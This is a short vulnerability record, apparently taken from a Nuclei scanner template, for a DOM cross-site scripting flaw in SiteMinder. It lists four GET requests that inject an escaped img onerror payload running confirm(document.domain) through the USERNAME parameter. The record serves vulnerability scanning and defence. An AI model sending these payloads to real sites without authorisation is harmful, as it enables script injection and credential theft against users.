# Vulnerability: SiteMinder - DOM Cross-Site Scripting
**Classification:** CWE-79
**Source:** Nuclei Template (`siteminder-dom-xss.yaml`)

## Description
SiteMinder contains a cross-site scripting vulnerability in the document object model. An attacker can execute arbitrary script in the browser of an unsuspecting user in the context of the affected site. This can allow the attacker to steal cookie-based authentication credentials and launch other attacks.

## Vulnerable Code Pattern / Exploit Payload
```http
GET {{BaseURL}}/siteminderagent/forms/smpwservices.fcc?USERNAME=\u003cimg\u0020src\u003dx\u0020onerror\u003d\u0022confirm(document.domain)\u0022\u003e&SMAUTHREASON=7
GET {{BaseURL}}/siteminderagent/forms/smaceauth.fcc?USERNAME=\u003cimg\u0020src\u003dx\u0020onerror\u003d\u0022confirm(document.domain)\u0022\u003e&SMAUTHREASON=7
GET {{BaseURL}}/siteminderagent/forms/smpwservices.fcc?USERNAME=\u003cimg\u0020src\u003dx\u0020onerror\u003d\u0022confirm\u0028document.domain\u0029\u0022\u003e&SMAUTHREASON=7
GET {{BaseURL}}/siteminderagent/forms/smaceauth.fcc?USERNAME=\u003cimg\u0020src\u003dx\u0020onerror\u003d\u0022confirm\u0028document.domain\u0029\u0022\u003e&SMAUTHREASON=7
```

